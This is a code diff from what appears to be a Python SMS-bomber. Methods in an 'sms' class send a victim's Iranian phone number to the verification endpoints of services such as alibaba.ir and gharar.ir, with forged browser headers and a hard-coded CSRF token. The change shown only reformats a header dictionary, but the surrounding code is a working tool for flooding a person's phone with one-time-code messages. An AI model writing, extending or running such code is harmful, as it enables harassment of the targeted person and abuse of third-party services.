@@ -86,6 +86,7 @@ class sms:
             pass
 
 
+        
     def alibaba(phone):
         alibabaH = {"Host": "ws.alibaba.ir", "User-Agent":generate_user_agent(os="win"), "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "ab-channel": "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR", "ab-alohomora": "MTMxOTIzNTI1MjU2NS4yNTEy", "Content-Type": "application/json;charset=utf-8", "Content-Length": "29", "Origin": "https://www.alibaba.ir", "Connection": "keep-alive", "Referer": "https://www.alibaba.ir/hotel"}
         alibabaD = {"phoneNumber": "0"+phone.split("+98")[1]}
@@ -1840,7 +1841,22 @@ class sms:
             
     def gharar(phone):
         n4 = f"phone=0{phone.split('+98')[1]}"
-        rhead = {'content-length': '17','sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"','sec-ch-ua-mobile': '?1','user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','accept': '*/*','x-requested-with': 'XMLHttpRequest','x-csrftoken': 'DP6LQ9sSuEs45ZZuEh5DJJ7sIEHnW30KbVLZFDAmOnqymk6gUw4Z1e9RV1j17DhG','sec-ch-ua-platform': 'Android','origin': 'https://gharar.ir','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://gharar.ir/','accept-encoding': 'gzip, deflate, br','accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7'}
+        rhead = {'content-length': '17',
+'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
+'sec-ch-ua-mobile': '?1',
+'user-agent': 'Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
+'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+'accept': '*/*',
+'x-requested-with': 'XMLHttpRequest',
+'x-csrftoken': 'DP6LQ9sSuEs45ZZuEh5DJJ7sIEHnW30KbVLZFDAmOnqymk6gUw4Z1e9RV1j17DhG',
+'sec-ch-ua-platform': 'Android',
+'origin': 'https://gharar.ir',
+'sec-fetch-site': 'same-origin',
+'sec-fetch-mode': 'cors',
+'sec-fetch-dest': 'empty',
+'referer': 'https://gharar.ir/',
+'accept-encoding': 'gzip, deflate, br',
+'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7'}
         try:
             post(url="https://gharar.ir/users/phone_number/",data=n4, headers=rhead)
             return True
